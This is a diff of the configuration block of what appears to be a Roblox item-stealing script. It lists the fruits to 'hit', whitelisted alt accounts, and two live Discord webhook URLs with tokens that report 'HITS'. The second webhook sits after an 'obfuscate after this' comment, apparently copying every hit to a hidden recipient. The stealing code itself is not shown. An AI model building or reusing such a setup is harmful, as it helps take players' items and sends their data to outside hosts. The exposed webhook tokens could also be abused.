@@ -1,14 +1,7 @@
 --[[ Script Configuration ]]--
 Webhook = "https://discordapp.com/api/webhooks/1356694454429548554/dKC5nLeUus500KvJ9L8GqOqS9WVvub2YUQh3Sbv-lVHtVuNg-BwlNspsQ5s_JCUI_jTl" -- Sends notifications on discord (HITS)
 Usernames = {"main username", "altusername1", "altusername2","youcanaddmore"} -- Whitelisted users
-FruitsToHit = { -- Fruits for general notification
-	"Gas-Gas",
-	"Kitsune-Kitsune",
-	"Leopard-Leopard",
-	"Yeti-Yeti",
-	"Gravity-Gravity",
-    "Love-Love"
-}
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Love-Love"}
 --obfuscate after this
 
 Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Sends the SAME notifications as Webhook (ALL HITS)
